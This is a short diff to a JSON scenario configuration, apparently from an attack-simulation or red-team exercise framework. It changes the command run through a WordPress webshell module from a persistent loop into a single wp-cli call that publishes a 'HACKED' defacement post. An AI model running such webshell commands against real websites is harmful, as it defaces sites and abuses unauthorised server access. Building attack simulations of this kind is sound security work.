@@ -170,7 +170,7 @@
                 "module": "modules/attacks/wordpress_exec_webshell.py",
                 "options": {
                     "user_agent": "I AM ATTACKER",
-                    "command": "while true; do sleep 60 && /usr/local/bin/wp post create --path=/var/www/html --post_type=post --post_status=publish --post_title=HACKED --post_author=1 --post_content=YESSS_WE_HACKED_YOUR_WEBSITE; done &"
+                    "command": "/usr/local/bin/wp post create --path=/var/www/html --post_type=post --post_status=publish --post_title=HACKED --post_author=1 --post_content=YESSS_WE_HACKED_YOUR_WEBSITE"
                 },
                 "libraries": [
                     "requests>=2.25.1"
